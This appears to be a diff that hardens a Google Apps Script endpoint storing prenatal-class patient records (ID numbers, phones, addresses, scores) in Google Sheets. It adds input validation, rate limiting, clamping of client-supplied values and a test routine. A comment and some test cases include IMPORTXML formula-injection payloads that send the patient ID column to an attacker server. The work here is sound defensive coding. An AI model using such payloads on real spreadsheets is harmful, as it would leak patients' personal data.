@@ -42,6 +42,18 @@
  *    Sheets hanya punya kontrol akses per-file dan tidak punya audit log
  *    yang layak. Bagikan spreadsheet ini HANYA ke akun bidan tertentu,
  *    jangan pernah pakai opsi "anyone with the link".
+ *
+ * ⚠️ URL Web App ini memberi akses TULIS ke sheet bagi siapa pun yang
+ *    memilikinya, dan pada aplikasi statis URL selalu terlihat di DevTools.
+ *    Repo aplikasinya publik, jadi URL bisa ditemukan pemindai otomatis.
+ *    Selama masa uji risiko ini diterima, tapi SEBELUM dipakai pasien nyata:
+ *      Deploy → Manage deployments → Edit → New version  (URL berubah)
+ *    atau jadikan repo private.
+ *
+ *    Yang sudah dipasang sebagai peredam: validasi ketat per field
+ *    (validasiSimpan), clamp KKM & jumlah sesi, pembatas laju penulisan
+ *    (lolosThrottle), dan penetral injeksi formula Sheets (amanTeks).
+ *    Jalankan ujiValidasi() untuk memastikan semuanya aktif.
  */
 
 /* Kolom (1-based) — supaya tidak ada angka ajaib berserakan. */
@@ -64,6 +76,157 @@ var HEADER_HARAPAN = [
 ];
 
 /* ══════════════════════════════════════════════════════════
+   ATURAN VALIDASI
+
+   Endpoint ini terbuka untuk siapa pun yang memiliki URL-nya, dan pada
+   aplikasi statis URL selalu terlihat di DevTools. Jadi endpoint tidak
+   boleh mempercayai apa pun yang dikirim klien.
+
+   Yang dijaga:
+   - bentuk setiap field (panjang, pola, rentang)
+   - kelurahan & puskesmas harus dari daftar resmi, bukan teks bebas
+   - KKM dan jumlah sesi tidak boleh ditentukan sepenuhnya oleh klien
+   - teks bebas dinetralkan dari injeksi formula Sheets
+   - laju penulisan dibatasi supaya tidak bisa dibanjiri
+   ══════════════════════════════════════════════════════════ */
+
+var BATAS = {
+  NAMA_MIN: 3,      NAMA_MAKS: 80,
+  ALAMAT_MIN: 5,    ALAMAT_MAKS: 200,
+  KKM_MIN: 50,      KKM_MAKS: 100,   KKM_DEFAULT: 75,
+  SESI_MAKS: 10,    SESI_DEFAULT: 4,
+  POIN_PER_SOAL: 10,                  // skor selalu kelipatan 10
+  SIMPAN_PER_JENDELA: 40,             // kapasitas nyata ~40 pasien/hari
+  JENDELA_MENIT: 10
+};
+
+/* Harus sama dengan KELURAHAN dan PUSKESMAS di config.js. */
+var KELURAHAN_SAH = [
+  'Jatinegara', 'Rawa Terate', 'Pulo Gebang', 'Cakung Timur',
+  'Cakung Barat', 'Ujung Menteng', 'Penggilingan PIK', 'Penggilingan Elok'
+];
+
+var PUSKESMAS_SAH = [
+  'Puskesmas Cakung', 'Pustu Jatinegara', 'Pustu Cakung Barat',
+  'Pustu Pulo Gebang', 'Pustu Penggilingan PIK', 'Pustu Penggilingan Elok',
+  'Pustu Rawa Terate', 'Pustu Ujung Menteng', 'Pustu Cakung Timur'
+];
+
+/* ══════════════════════════════════════════════════════════
+   VALIDASI
+   ══════════════════════════════════════════════════════════ */
+
+/**
+ * Netralkan teks bebas dari injeksi formula Sheets.
+ *
+ * Sel yang isinya diawali = + - @ (atau tab/CR) akan dieksekusi Sheets
+ * sebagai formula begitu bidan membuka spreadsheet. Payload seperti
+ *   =IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50);"//a")
+ * di kolom Nama bisa mengirim seluruh kolom NIK keluar tanpa perlu
+ * menembus apa pun — cukup mengisi form. Prefiks apostrof memaksa
+ * Sheets memperlakukan isinya sebagai teks biasa.
+ */
+function amanTeks(v) {
+  var s = String(v == null ? '' : v).trim();
+  if (!s) return '';
+  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
+}
+
+/** Buang apostrof pengaman saat nilai dibaca kembali untuk aplikasi. */
+function tanpaApostrof(v) {
+  return String(v == null ? '' : v).replace(/^'/, '');
+}
+
+/** Angka dalam rentang, atau nilai bawaan kalau klien mengirim yang aneh. */
+function dalamRentang(v, min, maks, bawaan) {
+  var n = Number(v);
+  return (isFinite(n) && n >= min && n <= maks) ? n : bawaan;
+}
+
+function anggotaDaftar(v, daftar) {
+  var s = String(v == null ? '' : v).trim();
+  for (var i = 0; i < daftar.length; i++) if (daftar[i] === s) return true;
+  return false;
+}
+
+/** Bilangan bulat dalam rentang. */
+function bulatDi(v, min, maks) {
+  var n = Number(v);
+  return isFinite(n) && n === Math.floor(n) && n >= min && n <= maks;
+}
+
+/**
+ * Periksa seluruh field sebelum apa pun ditulis.
+ *
+ * @returns {string} '' kalau lolos, atau alasan penolakan
+ */
+function validasiSimpan(p) {
+  var nik = bersihNik(p.nik);
+  if (nik.length !== 16) return 'NIK harus 16 digit angka';
+
+  var nama = String(p.nama == null ? '' : p.nama).trim();
+  if (nama.length < BATAS.NAMA_MIN || nama.length > BATAS.NAMA_MAKS) {
+    return 'Nama harus ' + BATAS.NAMA_MIN + '–' + BATAS.NAMA_MAKS + ' karakter';
+  }
+  // Nama orang tidak pernah mengandung tag HTML atau URL.
+  if (/[<>]|https?:\/\//i.test(nama)) return 'Nama mengandung karakter yang tidak diizinkan';
+
+  var noHp = String(p.noHp == null ? '' : p.noHp).replace(/[\s\-']/g, '');
+  if (!/^0\d{8,14}$/.test(noHp)) return 'No WA harus diawali 0 dan berisi 9–15 digit';
+
+  var alamat = String(p.alamat == null ? '' : p.alamat).trim();
+  if (alamat.length < BATAS.ALAMAT_MIN || alamat.length > BATAS.ALAMAT_MAKS) {
+    return 'Alamat harus ' + BATAS.ALAMAT_MIN + '–' + BATAS.ALAMAT_MAKS + ' karakter';
+  }
+  if (/[<>]|https?:\/\//i.test(alamat)) return 'Alamat mengandung karakter yang tidak diizinkan';
+
+  // Dua field ini datang dari dropdown tertutup di aplikasi. Kalau isinya
+  // di luar daftar, berarti request tidak berasal dari aplikasi.
+  if (!anggotaDaftar(p.kelurahan, KELURAHAN_SAH)) return 'Kelurahan tidak dikenal';
+  if (!anggotaDaftar(p.puskesmas, PUSKESMAS_SAH)) return 'Puskesmas tidak dikenal';
+
+  if (!bulatDi(p.kunjunganKe, 1, BATAS.SESI_MAKS)) {
+    return 'Kunjungan ke- harus 1–' + BATAS.SESI_MAKS;
+  }
+
+  // Soal Benar/Salah 10 butir × 10 poin, jadi skor selalu kelipatan 10.
+  // Nilai seperti 77 tidak mungkin berasal dari aplikasi.
+  var skor = [['Pre-Test', p.skorPre], ['Post-Test', p.skorPost]];
+  for (var i = 0; i < skor.length; i++) {
+    var v = Number(skor[i][1] == null || skor[i][1] === '' ? 0 : skor[i][1]);
+    if (!bulatDi(v, 0, 100)) return skor[i][0] + ' harus 0–100';
+    if (v % BATAS.POIN_PER_SOAL !== 0) {
+      return skor[i][0] + ' harus kelipatan ' + BATAS.POIN_PER_SOAL;
+    }
+  }
+
+  return '';
+}
+
+/**
+ * Pembatas laju penulisan.
+ *
+ * Endpoint terbuka, jadi tanpa ini satu skrip bisa membanjiri sheet
+ * sampai ribuan baris dalam semenit. Kapasitas nyata kelas ibu hamil
+ * jauh di bawah batas ini, jadi pasien asli tidak akan pernah kena.
+ */
+function lolosThrottle() {
+  var props = PropertiesService.getScriptProperties();
+  var sekarang = new Date().getTime();
+  var jendelaMs = BATAS.JENDELA_MENIT * 60 * 1000;
+  var mulai = Number(props.getProperty('throttleMulai')) || 0;
+  var hitung = Number(props.getProperty('throttleHitung')) || 0;
+
+  if (!mulai || sekarang - mulai > jendelaMs) {
+    props.setProperties({ throttleMulai: String(sekarang), throttleHitung: '1' });
+    return true;
+  }
+  if (hitung >= BATAS.SIMPAN_PER_JENDELA) return false;
+  props.setProperty('throttleHitung', String(hitung + 1));
+  return true;
+}
+
+/* ══════════════════════════════════════════════════════════
    ENTRY POINT
    ══════════════════════════════════════════════════════════ */
 
@@ -75,7 +238,9 @@ function doGet(e) {
     if (action === 'lookup') return json(handleLookup(p));
     if (action === 'save') return json(handleSave(p));
 
-    return json({ ok: true, message: 'KIARA endpoint aktif', versi: 3, kolom: JML_KOLOM });
+    // versi dinaikkan setiap file ini berubah — dipakai untuk memastikan
+    // deployment yang aktif benar-benar versi terbaru.
+    return json({ ok: true, message: 'KIARA endpoint aktif', versi: 4, kolom: JML_KOLOM });
   } catch (err) {
     return json({ ok: false, error: String(err && err.message ? err.message : err) });
   }
@@ -172,18 +337,23 @@ function handleLookup(p) {
   var akhir = riwayat[riwayat.length - 1];
   var barisAkhir = data[akhir.baris - 2];
 
+  // tanpaApostrof: amanTeks() bisa menambah prefiks ' pada teks bebas yang
+  // berbahaya bagi Sheets. Prefiks itu urusan penyimpanan, jangan sampai
+  // ikut muncul di form aplikasi.
   return {
     ok: true,
     baru: false,
-    nama: barisAkhir[K.NAMA - 1],
-    noHp: String(barisAkhir[K.WA - 1] || '').replace(/^'/, ''),
-    alamat: barisAkhir[K.ALAMAT - 1],
-    kelurahan: barisAkhir[K.KELURAHAN - 1],
-    puskesmas: barisAkhir[K.PUSKESMAS - 1],
+    nama: tanpaApostrof(barisAkhir[K.NAMA - 1]),
+    noHp: tanpaApostrof(barisAkhir[K.WA - 1]),
+    alamat: tanpaApostrof(barisAkhir[K.ALAMAT - 1]),
+    kelurahan: tanpaApostrof(barisAkhir[K.KELURAHAN - 1]),
+    puskesmas: tanpaApostrof(barisAkhir[K.PUSKESMAS - 1]),
     // Nama field tetap kunjunganTerakhir supaya cocok dengan visit-tracker.js
     kunjunganTerakhir: akhir.kunjunganKe,
     tglKunjunganTerakhir: tanggalTerbaru(riwayat),
-    status: akhir.kunjunganKe >= (Number(p.totalSesi) || 4) ? 'LULUS' : 'AKTIF',
+    status: akhir.kunjunganKe >=
+      dalamRentang(p.totalSesi, 1, BATAS.SESI_MAKS, BATAS.SESI_DEFAULT)
+      ? 'LULUS' : 'AKTIF',
     riwayat: riwayat,
     rataPost: rataPost(riwayat)
   };
@@ -204,10 +374,13 @@ function tanggalTerbaru(riwayat) {
    ══════════════════════════════════════════════════════════ */
 
 function handleSave(p) {
+  // Validasi dulu — murni hitungan, tidak menyentuh sheet. Request yang
+  // ditolak di sini tidak perlu ikut berebut lock.
+  var salah = validasiSimpan(p);
+  if (salah) return { ok: false, error: salah };
+
   var nik = bersihNik(p.nik);
   var kunjungan = Number(p.kunjunganKe);
-  if (!nik) return { ok: false, error: 'nik kosong' };
-  if (!kunjungan || kunjungan < 1) return { ok: false, error: 'kunjungan tidak valid' };
 
   // Kunci supaya dua pasien yang submit bersamaan tidak menimpa baris.
   var lock = LockService.getScriptLock();
@@ -220,10 +393,20 @@ function handleSave(p) {
     var beda = bedaHeader(sh);
     if (beda) return { ok: false, error: 'Susunan kolom sheet tidak sesuai — ' + beda };
 
+    // Di dalam lock supaya dua request bersamaan tidak sama-sama
+    // membaca hitungan lama lalu menulisnya kembali.
+    if (!lolosThrottle()) {
+      return { ok: false, error: 'Terlalu banyak penyimpanan dalam ' +
+        BATAS.JENDELA_MENIT + ' menit terakhir. Coba lagi sebentar.' };
+    }
+
     var data = ambilData(sh);
 
-    var kkm = Number(p.kkm) || 75;
-    var total = Number(p.totalSesi) || 4;
+    // KKM dan jumlah sesi tidak boleh ditentukan sepenuhnya oleh klien:
+    // kkm=0 akan membuat semua orang LULUS. Nilai di luar rentang wajar
+    // diabaikan, pakai bawaan.
+    var kkm = dalamRentang(p.kkm, BATAS.KKM_MIN, BATAS.KKM_MAKS, BATAS.KKM_DEFAULT);
+    var total = dalamRentang(p.totalSesi, 1, BATAS.SESI_MAKS, BATAS.SESI_DEFAULT);
     var pre = Number(p.skorPre) || 0;
     var post = Number(p.skorPost) || 0;
     var status = post >= kkm ? 'LULUS' : 'BELUM';
@@ -251,12 +434,12 @@ function handleSave(p) {
         nomorBerikut(sh),
         "'" + tanggalJakarta(),
         "'" + jamJakarta(),
-        String(p.nama || ''),
+        amanTeks(p.nama),
         "'" + nik,
-        "'" + String(p.noHp || ''),
-        String(p.alamat || ''),
-        String(p.kelurahan || ''),
-        String(p.puskesmas || ''),
+        "'" + String(p.noHp || '').replace(/[\s\-']/g, ''),
+        amanTeks(p.alamat),
+        amanTeks(p.kelurahan),
+        amanTeks(p.puskesmas),
         kunjungan,
         pre,
         post,
@@ -352,6 +535,71 @@ function ujiBaca() {
     (r.baru
       ? 'Belum ada baris uji. Jalankan ujiTulis() dulu.'
       : 'Sesi berikutnya akan terdeteksi: ' + (r.kunjunganTerakhir + 1))
+  );
+}
+
+/**
+ * Uji validasi tanpa menulis apa pun ke sheet.
+ *
+ * Memanggil validasiSimpan() langsung, jadi aman dijalankan kapan saja.
+ * Semua kasus buruk HARUS ditolak; kasus terakhir (payload asli) harus lolos.
+ */
+function ujiValidasi() {
+  var dasar = {
+    nik: NIK_UJI, nama: NAMA_UJI, noHp: '081200000000',
+    alamat: 'Alamat uji coba', kelurahan: 'Pulo Gebang',
+    puskesmas: 'Puskesmas Cakung', kunjunganKe: 1,
+    skorPre: 40, skorPost: 90
+  };
+
+  function dengan(ubah) {
+    var p = {}, k;
+    for (k in dasar) if (dasar.hasOwnProperty(k)) p[k] = dasar[k];
+    for (k in ubah) if (ubah.hasOwnProperty(k)) p[k] = ubah[k];
+    return p;
+  }
+
+  // [nama kasus, payload, harus ditolak?]
+  var kasus = [
+    ['NIK 15 digit',          dengan({ nik: '317512345678901' }),   true],
+    ['NIK berisi huruf',      dengan({ nik: '3175abc123456789' }),  true],
+    ['Nama 2 karakter',       dengan({ nama: 'Ab' }),               true],
+    ['Nama berisi tag HTML',  dengan({ nama: 'Ani <script>' }),     true],
+    ['Nama formula IMPORTXML',dengan({ nama: '=IMPORTXML("http://x/?d="&E2,"//a")' }), true],
+    ['No WA tanpa awalan 0',  dengan({ noHp: '81200000000' }),      true],
+    ['No WA terlalu pendek',  dengan({ noHp: '0812' }),             true],
+    ['Alamat 3 karakter',     dengan({ alamat: 'Jl.' }),            true],
+    ['Kelurahan karangan',    dengan({ kelurahan: 'Kelurahan Palsu' }), true],
+    ['Puskesmas karangan',    dengan({ puskesmas: 'Pustu Antah Berantah' }), true],
+    ['Kunjungan 0',           dengan({ kunjunganKe: 0 }),           true],
+    ['Kunjungan 99',          dengan({ kunjunganKe: 99 }),          true],
+    ['Skor 77 (bukan x10)',   dengan({ skorPost: 77 }),             true],
+    ['Skor 120',              dengan({ skorPost: 120 }),            true],
+    ['Payload asli',          dengan({}),                           false]
+  ];
+
+  var baris = [], gagal = 0;
+  for (var i = 0; i < kasus.length; i++) {
+    var pesan = validasiSimpan(kasus[i][1]);
+    var ditolak = pesan !== '';
+    var benar = ditolak === kasus[i][2];
+    if (!benar) gagal++;
+    baris.push((benar ? '  OK  ' : ' SALAH') + ' │ ' + kasus[i][0] +
+      (pesan ? ' → ' + pesan : ' → lolos'));
+  }
+
+  // Uji amanTeks terpisah — ini yang menahan injeksi formula.
+  var contoh = '=IMPORTXML("http://x","//a")';
+  var netral = amanTeks(contoh).charAt(0) === "'";
+
+  SpreadsheetApp.getUi().alert(
+    'UJI VALIDASI — ' + (kasus.length - gagal) + '/' + kasus.length + ' benar\n\n' +
+    baris.join('\n') +
+    '\n\nProteksi formula Sheets: ' + (netral ? 'AKTIF' : 'TIDAK AKTIF') +
+    '\n  ' + contoh + '\n  → ' + amanTeks(contoh) +
+    '\n\n' + (gagal === 0 && netral
+      ? 'Semua aturan berjalan sesuai harapan.'
+      : 'ADA YANG TIDAK SESUAI — periksa baris bertanda SALAH.')
   );
 }
 
